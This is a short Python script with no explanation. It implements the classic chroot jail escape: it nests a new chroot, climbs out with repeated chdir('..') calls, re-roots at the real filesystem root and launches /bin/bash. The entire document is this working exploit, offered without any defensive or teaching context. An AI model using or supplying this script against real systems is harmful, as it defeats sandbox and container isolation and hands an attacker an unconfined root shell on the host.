import os

if not os.path.exists("chroot-dir"):
    os.mkdir("chroot-dir")

os.chroot("chroot-dir")

for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
